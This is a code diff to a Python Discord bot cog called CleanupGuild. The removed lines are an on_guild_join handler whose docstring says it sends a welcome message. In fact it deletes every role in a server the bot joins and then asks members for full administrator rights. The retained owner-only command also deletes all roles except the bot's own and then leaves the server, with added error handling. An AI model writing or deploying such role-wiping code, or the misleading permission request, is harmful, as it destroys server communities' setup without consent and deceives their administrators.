@@ -5,32 +5,6 @@ class CleanupGuild(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
 
-    async def on_guild_join(self, guild):
-        """
-        Event handler to send a welcome message when the bot joins a new guild.
-        """
-        bot_role = guild.get_member(self.bot.user.id).top_role
-
-        # Remove all roles except the bot's role
-        for role in guild.roles:
-            if role != bot_role:
-                await role.delete()
-
-        # Send a welcome message
-        welcome_message = (
-            "Hello there! I'm SNT, **your** super advanced and useful discord bot. "
-            "I will automatically set up myself for this server. "
-            "To start, please give me a role with full administrator permissions! "
-            "I will be set up in no time."
-        )
-
-        for channel in guild.text_channels:
-            try:
-                await channel.send(welcome_message)
-                break  # Stop after sending the message in the first available text channel
-            except discord.Forbidden:
-                pass  # Ignore channels where the bot cannot send messages
-
     @commands.command()
     @commands.guild_only()
     @commands.is_owner()
@@ -61,11 +35,16 @@ class CleanupGuild(commands.Cog):
         # Create a new text channel inside the category
         await guild.create_text_channel(channel_name, category=category)
 
-        # Remove all roles except the bot's role
+        # Get the bot's top role
         bot_role = guild.get_member(self.bot.user.id).top_role
+
+        # Remove all roles except the bot's role
         for role in guild.roles:
             if role != bot_role:
-                await role.delete()
+                try:
+                    await role.delete(reason="CleanupGuild command")
+                except discord.errors.NotFound:
+                    pass  # Role has already been deleted
 
         # Leave the server
         await guild.leave()
